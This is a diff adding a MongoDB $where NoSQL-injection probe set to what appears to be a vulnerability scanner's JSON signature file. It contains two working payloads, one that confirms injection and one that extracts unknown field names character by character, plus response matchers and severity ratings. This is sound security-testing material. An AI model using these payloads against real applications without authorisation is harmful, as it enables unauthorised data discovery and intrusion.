@@ -609,6 +609,33 @@
           "variables": {}
         }
       ]
+    },
+    "mongodb_field_enum": {
+      "description": "NoSQL $where field-NAME enumeration (the 'extract unknown fields' lab) — Object.keys(this) discovers column names the response never reveals; walk length==N then match each key char-by-char.",
+      "tech_match": ["MongoDB", "Express", "Node.js", "Mongoose", "MEAN"],
+      "param_match": ["username", "password", "email", "login", "user", "filter", "search", "query", "id", "name"],
+      "probes": [
+        {
+          "payload": "{\"$where\":\"Object.keys(this).length>0\"}",
+          "description": "$where reaches Object.keys — a record with fields returns the full result set; length delta vs the clean baseline confirms $where injection and that field enumeration is possible.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 40}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"$where\":\"Object.keys(this)[0].match(/^.*/)\"}",
+          "description": "Per-field char-walk primitive — replace ^.* with ^<prefix> to recover an unknown field name one character at a time (TRUE returns records, FALSE returns none).",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 40}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
     }
   }
 }
